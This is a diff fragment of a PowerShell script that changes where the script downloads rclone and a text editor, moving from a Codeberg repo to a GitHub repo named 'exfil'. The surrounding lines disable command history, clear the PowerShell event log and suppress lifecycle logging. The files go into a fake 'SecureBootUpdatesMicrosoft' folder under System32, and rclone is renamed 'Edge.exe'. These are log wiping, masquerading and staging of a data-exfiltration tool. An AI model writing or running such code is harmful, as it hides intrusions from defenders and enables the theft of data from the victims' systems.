@@ -8,8 +8,8 @@ Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
 Clear-EventLog "Windows Powershell"
 $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent
-$rclonedlurl = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/Rclone.zip"
-$texteditorurl = "https://codeberg.org/sempiampi/mavericks/releases/download/v1.0.0/micro.zip"
+$rclonedlurl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/Rclone.zip"
+$texteditorurl = "https://github.com/sempiampi/exfil/releases/download/1.0.0/micro.zip"
 $basepath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\Rclone"
 $rclonezip = Join-Path -Path $basepath -ChildPath "Rclone.zip"
 $rcloneexe = Join-Path -Path $basepath -ChildPath "Edge.exe"
